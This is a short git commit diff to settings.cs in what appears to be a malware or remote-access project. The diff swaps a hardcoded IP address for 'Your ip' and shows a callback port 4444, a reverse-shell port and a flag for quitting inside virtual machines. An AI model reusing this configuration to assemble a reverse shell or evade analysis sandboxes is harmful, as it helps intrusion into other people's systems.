187400c5107b071236471997dfaf30dee7be3bb6
pysl <34405876+pysl@users.noreply.github.com>
2022-05-31 23:20:00 -0500

    Update settings.cs

--- settings.cs
+++ settings.cs
@@ -1,6 +1,6 @@
 namespace mw.settings {
     class Settings {
-        public static string ip = "99.70.90.188";
+        public static string ip = "Your ip";
         public static int port = 4444;
         public static int revsh_port = 3000;
         public static bool quit_on_vm = false;
